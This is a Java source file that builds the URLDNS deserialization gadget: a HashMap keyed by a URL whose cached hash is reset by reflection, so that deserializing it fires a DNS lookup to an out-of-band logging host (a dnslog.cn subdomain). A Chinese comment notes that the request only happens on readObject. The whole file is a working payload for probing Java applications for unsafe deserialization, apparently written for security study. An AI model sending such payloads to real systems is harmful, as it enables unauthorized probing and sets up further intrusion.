package summer.serializable;


import summer.util.Reflections;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class urldns {
    public static void main(String[] args) throws Exception {

        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) {
                return null;
            }
            @Override
            protected synchronized InetAddress getHostAddress(URL u){
                return null;
            }
        };

        HashMap hm = new HashMap();
        String u = "http://42onoe.dnslog.cn";
        URL url = new URL(null,u,handler);
        hm.put(url,url);

        Reflections.setFieldValue(url,"hashCode",-1);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("url"));
        oos.writeObject(hm);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("url"));
        // 注释这行代码是不会产生dns解析请求，
        ois.readObject();


    }
}